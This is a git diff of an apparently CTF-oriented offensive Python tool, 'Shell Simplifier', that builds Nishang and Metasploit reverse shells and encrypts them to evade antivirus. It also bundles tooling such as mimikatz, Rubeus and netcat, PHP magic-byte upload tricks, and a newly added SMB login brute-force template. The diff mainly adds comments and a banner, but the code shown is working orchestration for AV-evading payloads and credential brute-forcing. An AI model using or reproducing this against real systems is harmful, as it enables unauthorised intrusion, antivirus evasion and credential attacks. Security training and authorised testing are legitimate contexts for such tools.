@@ -108,7 +108,7 @@ def select_item(list, length):
         try:
             float(inp)
         except ValueError:   
-            print (Fore.RED+"[-] Please select a number from the list !")
+            print (Fore.RED+"Please select a number from the list !")
             exit(1)
     try:        
         if res in range(1, length+1):
@@ -426,38 +426,38 @@ def tvasion(ip,port,type,shell):
     if type == "nishang":
         nishang_name = nishang(ip,port)
         nishang_path = str(current_path)+"/"+nishang_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) 
-        path_to_encrypted = str(current_path)+temp 
-        enc_tool_path = str(script_pt)+"/tvasion.ps1" 
-        args = " -t ps1 "+nishang_path+ " -o "+tmp_folder 
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
+        path_to_encrypted = str(current_path)+temp #get the path
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path 
+        args = " -t ps1 "+nishang_path+ " -o "+tmp_folder #save the file into temp folder
         command = enc_tool_path+args
         #encr = subprocess.check_output([command]) #excute  the encryption
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
         res = subprocess.check_output(["ls", path_to_encrypted])
-        en_file_name = res.decode('UTF-8').strip() 
-        exact_file_name_path = path_to_encrypted+en_file_name 
+        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
+        exact_file_name_path = path_to_encrypted+en_file_name #encrypted nishang
         final_shell = current_path+"/en-"+nishang_name
         original_shell = current_path+"/"+nishang_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell])     
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])
     elif type == "msf":
         shell_name = msfc(ip,port,shell)
         shell_path = str(current_path)+"/"+shell_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) 
-        path_to_encrypted = str(current_path)+temp 
-        enc_tool_path = str(script_pt)+"/tvasion.ps1" 
-        args = " -t exe "+shell_path+ " -o "+tmp_folder 
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
+        path_to_encrypted = str(current_path)+temp #get the path
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
+        args = " -t exe "+shell_path+ " -o "+tmp_folder #save the file into temp folder
         command = enc_tool_path+args
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
         res = subprocess.check_output(["ls", path_to_encrypted])
-        en_file_name = res.decode('UTF-8').strip() 
+        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
         exact_file_name_path = path_to_encrypted+en_file_name
         final_shell = current_path+"/en-"+shell_name
         original_shell = current_path+"/"+shell_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell])    
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])
 
@@ -473,7 +473,7 @@ linux_tools = ["LinEnum.sh","linpeas.sh","lse.sh","nc","pspy64","pwncat"]
 windows_enum = ["jaws.ps1","PowerUp.ps1","Sherlock.ps1","winPEAS.bat","wp.exe"]
 windows_tools =["accesschk.exe","curl.exe","nc.exe","powerview.ps1","wget.exe","base64.exe","dumpcap.exe","powercat.ps1","procdump64.exe","chisel86.exe","juicy.exe","powermad.ps1","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
 magic_bytes = ["jpg simple php magic bytes","jpg full php magic bytes","gif simple php magic bytes","gif full php magic bytes"]
-template = ["python","php"]
+template = ["python","php","smb-login-brute.sh"]
 encrypted = ["nishang","msf"]
 msf = ["windows/x64/exec","windows/x64/meterpreter/reverse_tcp"]
 msf_size = len(msf)
@@ -489,14 +489,16 @@ main_list_windows_size = len(main_list_windows)
 main_list_linux_size = len(main_list_linux)
 os_list_size = len(os_list)
 
-ascii_banner = pyfiglet.figlet_format("Shell Simplifier !")
-author = "\n\t\t\t\t\t\t\tby YaSsInE\n\n"
-contact1 = "\t\tWebsite    : https://0xyassine.github.io\n"
-contact2 = "\t\tHackTheBox : https://www.hackthebox.eu/profile/143843\n"
-version = "\t\t\t\t\t\t\t\t v1.1\n"
 
 clear()
-print(Fore.RED + ascii_banner+author+contact1+contact2+Fore.GREEN+version)
+ascii_banner = pyfiglet.figlet_format("Shell Simplifier !")
+print(Fore.RED+ascii_banner)
+print("\n\t\t\t\t\t\t\tby YaSsInE\n")
+print("\t"+Fore.GREEN+60*"=")
+print(Fore.GREEN+"\t="+Fore.BLUE+"  Website    : https://0xyassine.github.io"+Fore.GREEN+"\t\t   =")
+print(Fore.GREEN+"\t="+Fore.BLUE+"  HackTheBox : https://www.hackthebox.eu/profile/143843"+Fore.GREEN+"   =")
+print(Fore.GREEN+"\t="+Fore.RED+"\t\t\t\t\t\t    v1.2"+Fore.GREEN+"   =")
+print("\t"+Fore.GREEN+60*"="+"\n")
 
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -651,6 +653,8 @@ elif os_item == "Bruteforce template":
         move_files("template","python","brute.py")
     elif template_item == "php":
         move_files("template","php","brute.php")
+    elif template_item == "smb-login-brute.sh":
+    	move_files("template","bash","smb-login-brute.sh") 
 elif os_item == "AV Bypass":         
     encrypted_item = select_item(encrypted, encrypted_size)
     if encrypted_item == "nishang":
